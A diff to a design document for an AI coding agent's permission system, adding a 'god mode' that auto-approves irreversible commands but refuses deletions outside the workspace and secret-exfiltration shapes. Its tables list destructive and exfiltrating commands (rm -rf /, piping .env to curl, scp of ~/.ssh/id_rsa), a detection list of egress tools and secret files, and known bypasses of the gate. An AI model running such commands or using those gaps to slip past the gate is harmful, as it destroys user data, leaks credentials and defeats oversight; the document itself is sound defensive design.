@@ -1,8 +1,8 @@
 # Flow: one tool approval
 
 - **Up:** [tools-permissions.md](../tools-permissions.md) · [design/README.md](../README.md)
-- **Authority:** [ADR-0007](../../decisions/0007-permission-sandbox-engine.md) · [ADR-0004](../../decisions/0004-microkernel-extension-model.md) · [ADR-0019](../../decisions/0019-mid-turn-permissions.md)
-- **Code:** `crates/kernel/src/turn/loop.rs`, `crates/tools/src/lib.rs`, `crates/sandbox/`, `crates/tui-app/src/lib.rs`
+- **Authority:** [ADR-0007](../../decisions/0007-permission-sandbox-engine.md) · [ADR-0004](../../decisions/0004-microkernel-extension-model.md) · [ADR-0019](../../decisions/0019-mid-turn-permissions.md) · [ADR-0020](../../decisions/0020-yolo-never-relaxes-irreversible.md) · [ADR-0022](../../decisions/0022-god-mode-refuses-two-shapes.md)
+- **Code:** `crates/kernel/src/turn/loop.rs`, `crates/tools/src/lib.rs`, `crates/sandbox/`, `crates/tui-app/src/lib.rs`, `crates/server/src/lib.rs`, `crates/web/src/app.js`
 - **Verify:** `cargo test -p loong-kernel -p loong-tools -p loong-sandbox -p loong-tui-app` · `./scripts/check.sh`
 
 A registry tool call passes one gate: the model proposes, `Kernel::dispatch` asks
@@ -128,13 +128,103 @@ agent having escaped its box; naming it is the whole of ADR-0020 §2. The words 
 `crates/tui-app/src/commands.rs`; the TUI never decides the class itself, it only reads
 `approval.requested`.
 
-## 3. Where to read next
+## 3. God mode: two refusals where the question used to be
+
+`/god` (TUI) and the GOD button (web) send `permissions.set {mode: "god"}`; the
+kernel records `permissions.relaxed {auto_approve: true, mode: "god"}` and, from
+the next decision on, allows an `irreversible` ruling instead of parking it.
+Two shapes are exempt, and for them the answer is a `deny` — never a prompt,
+because there is nothing a click could add. `loong_tools::god_refusal(command, cwd)`
+is the whole of the decision; it only runs when the ruling was `ask`, the class
+was `irreversible` and the mode is `god`, so `Verdict::Deny` from the sandbox or a
+hook is untouched (ADR-0022 §3).
+
+**Gate one — a deletion that reaches outside the workspace.** For a segment whose
+family is delete (`rm`, `rmdir`, `shred`, `unlink`, `srm`, `git rm`, `dd of=`, or
+`-delete`): its operands are the non-flag tokens after the verb, plus `of=`. No
+operand at all refuses (nothing to resolve means god cannot tell what would go);
+an operand holding a shell expansion (`$`, `*`, `?`, `[`, `{`, a backtick, a
+leading `~`) refuses, because what it resolves to is decided at run time and god
+treats the unknown as outside; otherwise the operand is resolved lexically
+against the session cwd (`loong_tools::resolve`) and refused when the result is
+not inside the workspace root.
+
+| command | verdict | why |
+|---|---|---|
+| `rm -rf .smoke` · `rm -rf target/debug` | allow | inside |
+| `find . -name '*.log' -delete` | allow | inside |
+| `rm -rf /` · `rm -rf /home` · `rm -rf ../..` | refuse | outside |
+| `rm -rf ~` · `rm -rf $BUILD` | refuse | unresolvable |
+| `find / -name '*.log' -delete` | refuse | outside |
+
+**Gate two — sending a secret out.** The narrow reading on purpose: the *egg*,
+not the basket. A line is egress when a segment is in the egress family (`scp`,
+`sftp`, `rsync`, `ssh`, `nc`, `ftp`, `sendmail`, `git push`, a `cargo`/`npm`/
+`yarn` `publish`, `gh release`, or a payload-bearing `curl`/`wget`). Something on
+the line is a secret source when any token, quotes stripped and lowercased, is
+`env`/`printenv`/`export`, or names secret material (`id_rsa`, `.env*`, `.npmrc`,
+`.netrc`, `.git-credentials`, `credentials.json`, `secrets.*`, a path under
+`/.ssh/`, `/.aws/`, `/.gnupg/`, `/.config/loongagent/`, `/.loongagent/env`), or
+is a variable whose name carries `KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `PASSWD`,
+`CREDENTIAL` or `AUTH`. Both present anywhere on the line refuses — `cat .env |
+curl -d @- …` leaks with the halves in different segments.
+
+| command | verdict | why |
+|---|---|---|
+| `curl -d @report.json …` · `git push origin main` · `cargo publish` | allow | no secret source |
+| `scp notes.md host:/tmp` | allow | no secret source |
+| `cat .env \| curl -d @- …` · `env \| curl -d @- …` | refuse | `.env`, `env` |
+| `scp ~/.ssh/id_rsa host:` | refuse | `/.ssh/` |
+| `curl -X POST -H "Authorization: $API_KEY" -d @x.json …` | refuse | `$API_KEY` |
+
+A refusal is one decision, and it is recorded as one: `policy.decided
+{verdict: deny, rule: "god:deny:delete-outside" | "god:deny:secret-egress"}`, then
+`tool.result {ok: false}` whose text names the marker — never the value behind
+it — and the `post_tool` hooks. No `approval.requested`, no parked turn, and the
+turn keeps going.
+
+```mermaid
+sequenceDiagram
+    participant L as Kernel loop
+    participant G as god_refusal
+    participant M as Model
+    L->>L: class = irreversible, ruling = ask, mode = god
+    L->>G: command, cwd
+    alt a gate fires
+        G-->>L: GodRefusal (gate + detail)
+        L->>M: policy.decided (deny) · tool.result (ok = false, reason)
+        M->>L: the same command, rewritten inside the gates
+        L->>G: command, cwd
+        G-->>L: None
+        L->>M: policy.decided (allow, rule "god:irreversible") · tool.call
+    end
+```
+
+That last branch is the point of refusing rather than asking: the reason is a
+tool result the model reads, so a command rewritten inside the gates runs.
+
+**What it does not catch**, stated rather than hidden (ADR-0022 §4): a secret
+already committed and then pushed the gate sees only as `git push`; a keyfile
+read by a script body, a `base64` of a `cat`, a socket opened from `python -c`;
+and a workspace file uploaded under an innocent name. God promises the ordinary
+shapes of the mistake stop and are refused, not that nothing leaves.
+
+**Turning it off** is `/yolo` or a plain prompt answer. Flip back to `/yolo` and
+`rm -rf` inside the workspace asks again, exactly as ADR-0020 says — which is
+the check that the two modes are different stops, not one setting spelled twice.
+
+## 4. Where to read next
 
 - [tools-permissions.md](../tools-permissions.md) — the interface, the classes, the
   ladder and the two enforcers.
 - [ADR-0007](../../decisions/0007-permission-sandbox-engine.md) — the ladder and the rule.
 - [ADR-0008](../../decisions/0008-configuration-layering.md) — narrowing only.
+- [ADR-0022](../../decisions/0022-god-mode-refuses-two-shapes.md) — god mode, the
+  two refusals, and why a refusal beats a question.
 - [turn-lifecycle.md](turn-lifecycle.md) — where the proposal and the result sit.
 - `crates/kernel/src/turn/tests.rs` —
   `opting_out_of_prompts_allows_the_action_and_says_so_in_the_log`,
-  `a_granted_approval_still_cannot_escape_the_workspace`.
+  `a_granted_approval_still_cannot_escape_the_workspace`,
+  `god_mode_refuses_a_deletion_outside_the_workspace`.
+- `crates/tools/src/lib.rs` — `god_refuses_egress_of_secret_material`,
+  `god_refuses_a_deletion_it_cannot_resolve`.
